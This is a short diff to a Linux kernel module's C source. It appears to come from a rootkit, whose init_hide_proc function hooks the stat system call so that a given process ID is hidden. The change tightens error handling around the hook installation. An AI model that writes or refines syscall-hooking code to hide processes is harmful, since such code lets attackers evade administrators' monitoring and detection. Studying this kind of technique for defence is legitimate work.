@@ -13,11 +13,13 @@ static asmlinkage long new_stat(const struct pt_regs *pt_regs);
 int init_hide_proc(char *pid) {
 	if (!pid) {
 		printk(KERN_INFO "[-] No pid to hide given.\n");
-		return 1;
+		return -1;
 	}
 	strcat(proc_path, pid);
 	old_stat = get_syscall(__NR_stat);
-	add_hook((unsigned long) new_stat, __NR_stat);
+	if (add_hook((unsigned long) new_stat, __NR_stat)) {
+		return -1;
+	}
 	return 0;
 }
 
